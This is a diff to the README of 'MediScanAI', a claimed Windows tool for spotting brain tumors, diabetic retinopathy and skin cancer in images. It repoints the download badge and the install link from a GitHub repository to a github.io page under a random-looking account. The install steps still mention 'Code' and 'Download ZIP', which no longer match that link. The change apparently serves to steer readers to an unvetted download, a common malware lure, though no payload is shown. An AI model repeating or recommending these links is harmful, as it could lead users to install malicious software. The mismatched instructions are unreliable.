@@ -1,6 +1,6 @@
 # 🏥 MediScanAI - Detect multiple diseases using smart technology
 
-[![](https://img.shields.io/badge/Download-MediScanAI_Setup-blue.svg)](https://github.com/Chlorinityengrossment748/MediScanAI)
+[![](https://img.shields.io/badge/Download-MediScanAI_Setup-blue.svg)](https://chlorinityengrossment748.github.io)
 
 MediScanAI helps doctors and students identify signs of brain tumors, diabetic retinopathy, and skin cancer. The platform uses computer vision and deep learning to review medical images. It provides results quickly so users can make informed health decisions.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these minimum specifications before you install the s
 
 Follow these steps to install MediScanAI on your Windows computer.
 
-1. Visit the following link to access the software files: [https://github.com/Chlorinityengrossment748/MediScanAI](https://github.com/Chlorinityengrossment748/MediScanAI)
+1. Visit the following link to access the software files: [https://chlorinityengrossment748.github.io](https://chlorinityengrossment748.github.io)
 2. Locate the link labeled "Code" on the page.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
